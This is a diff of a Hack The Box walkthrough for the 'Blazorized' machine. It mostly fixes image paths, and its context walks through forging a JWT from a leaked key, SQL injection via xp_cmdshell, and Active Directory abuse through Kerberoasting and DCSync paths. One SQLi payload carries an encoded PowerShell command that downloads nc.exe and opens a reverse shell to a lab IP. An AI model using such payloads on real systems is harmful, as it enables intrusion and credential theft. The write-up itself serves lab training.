@@ -6,21 +6,21 @@
 
 I wanted to create this machine to raise the awareness of pitfalls even senior web developers might fall for when building web applications with modern [Single Webpage Applications (SPAs)](https://learn.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/choose-between-traditional-web-and-single-page-apps) frameworks, most notably, `Blazor`. [Blazor WebAssembly](https://learn.microsoft.com/en-us/aspnet/core/blazor/?view=aspnetcore-7.0#blazor-webassembly), one of the target frameworks of `Blazorzied`, downloads all of a web application's assemblies (and the `.NET runtime`) to a client's browser:
 
-![Blazorized_walkthrough_image_1.png](DigitalGarden/HTB Walkthroughs/assets/Blazorized/Blazorized_walkthrough_image_1.png)
+![Blazorized_walkthrough_image_1.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_1.png)
 
 The [client's browser](https://learn.microsoft.com/en-us/aspnet/core/blazor/?view=aspnetcore-7.0#blazor-webassembly) downloads the web application's source code and executes it directly thanks to [WASM](https://webassembly.org/):
 
-![Blazorized_walkthrough_image_2.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_2.png)
+![Blazorized_walkthrough_image_2.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_2.png)
 
 [Microsoft](https://learn.microsoft.com/en-us/aspnet/core/blazor/security/webassembly/?view=aspnetcore-7.0#client-sidespa-security) has a dare warning on the nature of `Blazor WebAssembly` web applications, instructing web developers to never have secrets on them:
 
-![Blazorized_walkthrough_image_3.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_3.png)
+![Blazorized_walkthrough_image_3.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_3.png)
 
 For `Blazorized`, players need to abuse a `Blazor WebAssembly` web application that makes use of a shared class library containing a class to sign and validate JWTs, allowing them to access a super admin panel that the web developer built with `Blazor Server`.
 
 [Blazor Server](https://learn.microsoft.com/en-us/aspnet/core/blazor/hosting-models?view=aspnetcore-7.0#blazor-server), on the other hand, runs entirely on the server:
 
-![Blazorized_walkthrough_image_4.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_4.png)
+![Blazorized_walkthrough_image_4.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_4.png)
 
 For `Blazorized`, players must exploit a SQLi in a `Blazor Server` web application that uses Windows Authentication to communicate directly with a SQL Server.
 
@@ -39,33 +39,33 @@ And two _shared class libraries_:
 
 Web developers always rely on shared class libraries instead of repeating the same functions in the two projects. However, in the case of `Blazor WebAssembly`, this backfires as the shared class library will get downloaded on the client's browser. Because `blazorized.htb` and `admin.blazorized.htb` require signed JWTs for certain authorized functionalities (fetching all data from `api.blazorized.htb`, for example), the web developer makes a grave mistake of creating and using one shared class library for JWT operations, `Blazorzied.Helpers`:
 
-![Blazorized_walkthrough_image_5.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_5.png)
+![Blazorized_walkthrough_image_5.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_5.png)
 
 `Blazorized.Helpers` contains a static class named `JWT` responsible for performing validation and signing of JWTs, and most importantly, it contains the JWT secret key:
 
-![Blazorized_walkthrough_image_6.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_6.png)
+![Blazorized_walkthrough_image_6.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_6.png)
 
 This JWT secret key is the same one used by `api.blazorized.htb`:
 
-![Blazorized_walkthrough_image_7.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_7.png)
+![Blazorized_walkthrough_image_7.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_7.png)
 
 The API validates a JWT based on certain validation parameters:
 
-![Blazorized_walkthrough_image_8.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_8.png)
+![Blazorized_walkthrough_image_8.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_8.png)
 
 On the `Blazor WebAssembly` app, the developer uses the `GenerateTemporaryJWT` function to generate a JWT that allows the HTTP client to access `api.blazorzied.htb` with the required authorization header:
 
-![Blazorized_walkthrough_image_9.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_9.png)
+![Blazorized_walkthrough_image_9.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_9.png)
 
 While on the `Blazor Server` app, the developer uses the `GenerateSuperAdminJWT` function when the admin signs in:
 
-![Blazorized_walkthrough_image_10.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_10.png)
+![Blazorized_walkthrough_image_10.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_10.png)
 
 Regardless of using [Dapper ORM](https://github.com/DapperLib/Dapper) and parameterized SQL queries for the entire project, the developer mistakenly forgot to use them when writing the `CheckDuplicateName` and `CheckDuplicateTitle` functions, rendering them vulnerable to SQLi:
 
-![Blazorized_walkthrough_image_11.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_11.png)
+![Blazorized_walkthrough_image_11.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_11.png)
 
-![Blazorized_walkthrough_image_12.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_12.png)
+![Blazorized_walkthrough_image_12.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_12.png)
 
 ---
 
@@ -81,7 +81,7 @@ After cracking the password of `RSA_4810`, players will discover, via manual enu
 
 See the graph below describing the AD environment and the DACL misconfigurations `Blazorized` suffers from:
 
-![Blazorized_walkthrough_image_13.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_13.png)
+![Blazorized_walkthrough_image_13.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_13.png)
 
 # Writeup
 
@@ -163,75 +163,75 @@ Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds
 
 Add the domain name `blazorized.htb` into `/etc/hosts` and visit the website by providing it the IP address to get redirected automatically to `blazorized.htb/` (achieved via the `URL Rewrite 2.0` IIS module):
 
-![Blazorized_walkthrough_image_17.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_17.png)
+![Blazorized_walkthrough_image_17.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_17.png)
 
-![Blazorized_walkthrough_image_18.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_18.png)
+![Blazorized_walkthrough_image_18.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_18.png)
 
 Notice that the footer says the web application is built with `Blazor WebAssembly`:
 
-![Blazorized_walkthrough_image_19.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_19.png)
+![Blazorized_walkthrough_image_19.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_19.png)
 
 Notice that pages with the `/post/{GUID}` routes fail to fetch data from the API:
 
-![Blazorized_walkthrough_image_20.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_20.png)
+![Blazorized_walkthrough_image_20.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_20.png)
 
 Inspect the request to find a new `api.blazorized.htb` subdomain:
 
-![Blazorized_walkthrough_image_21.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_21.png)
+![Blazorized_walkthrough_image_21.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_21.png)
 
 Add it to `/etc/hosts` and try again:
 
-![Blazorized_walkthrough_image_22.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_22.png)
+![Blazorized_walkthrough_image_22.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_22.png)
 
 Explore the Swagger UI over `api.blazorized.htb/swagger/index.html`:
 
-![Blazorized_walkthrough_image_23.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_23.png)
+![Blazorized_walkthrough_image_23.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_23.png)
 
 Inspect the network tab and notice that the entire web application, including the `.NET runtime`, is downloaded over the browser (due to it being developed using `Blazor WebAssembly`):
 
-![Blazorized_walkthrough_image_24.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_24.png)
+![Blazorized_walkthrough_image_24.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_24.png)
 
 Perform `vHost` fuzzing to find `admin.blazorized.htb` and add it into `/etc/hosts`; notice that it uses [Authentication and Authorization](https://learn.microsoft.com/en-us/aspnet/core/blazor/security/?view=aspnetcore-7.0) and is built with `Blazor Server`:
 
-![Blazorized_walkthrough_image_25.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_25.png)
+![Blazorized_walkthrough_image_25.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_25.png)
 
 This super admin panel is not intended for players to use for signing in because the super admin's password is a 32-characters long randomly generated string:
 
-![Blazorized_walkthrough_image_26.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_26.png)
+![Blazorized_walkthrough_image_26.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_26.png)
 
 ## Foothold
 
 Check the `Check for Updates` tab to find a button that allows impersonating the super admin temporarily; additionally, inspect network requests to notice the [lazily loaded](https://learn.microsoft.com/en-us/aspnet/core/blazor/webassembly-lazy-load-assemblies?view=aspnetcore-8.0) `Blazorized.Helpers.dll` being downloaded from the IIS server (because it is only required in this page, in case it does not show up, make sure to disable caching):
 
-![Blazorized_walkthrough_image_27.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_27.png)
+![Blazorized_walkthrough_image_27.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_27.png)
 
 Click the `Check for Updates` button and inspect the requests to `posts` and `categories` to notice that they contain a JWT:
 
-![Blazorized_walkthrough_image_28.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_28.png)
+![Blazorized_walkthrough_image_28.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_28.png)
 
-![Blazorized_walkthrough_image_29.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_29.png)
+![Blazorized_walkthrough_image_29.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_29.png)
 
 Paste the JWT into [jwt.io](https://jwt.io/):
 
-![Blazorized_walkthrough_image_30.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_30.png)
+![Blazorized_walkthrough_image_30.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_30.png)
 
 Download the lazily loaded `Blazorized.Helpers.dll` for further analysis:
 
-![Blazorized_walkthrough_image_31.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_31.png)
+![Blazorized_walkthrough_image_31.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_31.png)
 
-![Blazorized_walkthrough_image_32.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_32.png)
+![Blazorized_walkthrough_image_32.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_32.png)
 
 Use [ILSpy](https://github.com/icsharpcode/ILSpy) or [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy)  to decompile the DLL and notice that `Blazorized.Helpers` contains multiple classes:
 
-![Blazorized_walkthrough_image_33.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_33.png)
+![Blazorized_walkthrough_image_33.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_33.png)
 
 Inspect the `JWT` class to find the required parameters to create signed JWTs, including the claims of a `Super Admin`:
 
-![Blazorized_walkthrough_image_34.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_34.png)
+![Blazorized_walkthrough_image_34.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_34.png)
 
 Additionally, read the `GetSigningCredentials` and `GenerateSuperAdminJWT` functions to understand what a JWT is validated for regarding accepted signing algorithms, claims, and other validation parameters:
 
-![Blazorized_walkthrough_image_35.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_35.png)
+![Blazorized_walkthrough_image_35.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_35.png)
 
 Create a JWT as the `Super_Admin` using [PyJWT](https://pyjwt.readthedocs.io/en/stable/) (for example):
 
@@ -250,19 +250,19 @@ eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8
 
 Navigate to the previously discovered `admin.blazorized.htb` subdomain and add the JWT as a cookie:
 
-![Blazorized_walkthrough_image_36.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_36.png)
+![Blazorized_walkthrough_image_36.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_36.png)
 
 Refresh the page to get redirected to the `/home` page. On it, notice that it says the web application speaks to the database directly, hinting that *Windows Authentication* is utilized for connecting to the SQL Server:
 
-![Blazorized_walkthrough_image_37.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_37.png)
+![Blazorized_walkthrough_image_37.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_37.png)
 
 Check the `/check-duplicate-post-title`/`check-duplicate-category-name` routes/pages:
 
-![Blazorized_walkthrough_image_38.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_38.png)
+![Blazorized_walkthrough_image_38.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_38.png)
 
 Try to inject SQL:
 
-![Blazorized_walkthrough_image_39.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_39.png)
+![Blazorized_walkthrough_image_39.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_39.png)
 
 Get a reverse shell (make sure the directory being written to is universally writable; for example, `C:\Windows\Tasks\` will not work):
 
@@ -307,11 +307,11 @@ The SQLi payload is:
 ad'; EXEC xp_cmdshell 'powershell -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAyADkALgAyADIAOQAuADgANAA6ADkAMAAwADEALwBuAGMALgBlAHgAZQAiACwAIAAiAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADIAOQAuADIAMgA5AC4AOAA0ACAAOQAwADAAMgAgAC0AZQAgAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlADsA' -- -
 ```
 
-![Blazorized_walkthrough_image_40.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_40.png)
+![Blazorized_walkthrough_image_40.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_40.png)
 
 Land as `NU_1055` and notice that it _DOES NOT_ possess `SeImpersonatePrivilege` (no 🥔 for today):
 
-![Blazorized_walkthrough_image_41.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_41.png)
+![Blazorized_walkthrough_image_41.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_41.png)
 
 Start a PowerShell session and download [SharpHound.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpHound.exe ):
 
@@ -359,7 +359,7 @@ cat bloodhound.b64 | base64 -d > BloodHoundData.zip
 
 To avoid weird naming issues that `BloodHound` might run into, instead of uploading the ZIP directly, unzip it and then upload the `json` files; notice that `NU_1055` has `WriteSPN` over `RSA_4810`:
 
-![Blazorized_walkthrough_image_42.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_42.png)
+![Blazorized_walkthrough_image_42.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_42.png)
 
 Download [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) (or carry out the attack using [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) from Linux):
 
@@ -407,17 +407,17 @@ Hash.Target......: $krb5tgs$23$*RSA_4810$blazorized.htb$doesnotmatter/...a89f5b
 
 Players will see that `RSA_4810` has 0 `First Degree Object Control`:
 
-![Blazorized_walkthrough_image_43.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_43.png)
+![Blazorized_walkthrough_image_43.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_43.png)
 
 Even if `SharpHound` gets rerun as `RSA_4810`, the ingested data will show the same output.
 
 Check the shortest path to domain admins and notice that the group `SUPER_SUPPORT_ADMINISTRATORS` can DCSync the domain:
 
-![Blazorized_walkthrough_image_44.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_44.png)
+![Blazorized_walkthrough_image_44.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_44.png)
 
 Also notice that `SSA_6010` is a member of that group:
 
-![Blazorized_walkthrough_image_45.png](DigitalGarden/assets/HTB Walkthroughs/Blazorized/Blazorized_walkthrough_image_45.png)
+![Blazorized_walkthrough_image_45.png](DigitalGarden/assets/HTB_Walkthroughs/Blazorized/Blazorized_walkthrough_image_45.png)
 
 `Evil-WinRM` into the DC using the credentials of `RSA_4810`:
 
